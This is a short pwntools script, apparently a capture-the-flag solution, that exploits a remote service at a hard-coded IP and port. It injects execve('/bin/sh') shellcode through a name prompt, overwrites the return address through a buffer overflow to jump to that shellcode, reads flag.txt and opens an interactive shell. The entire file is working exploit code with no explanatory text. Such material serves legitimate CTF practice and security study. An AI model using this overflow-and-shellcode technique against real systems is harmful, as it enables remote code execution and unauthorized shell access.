from pwn import *

r = remote('140.110.112.218', 2122)

# https://www.exploit-db.com/shellcodes/46907
shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05" 

# Name  
r.recvuntil(":")
r.sendline(shellcode)

# Try your best
r.recvuntil(":")
r.sendline(b'a'*(0x20 + 0x8) + p64(0x00601080))
r.sendline("cat flag.txt")

r.interactive()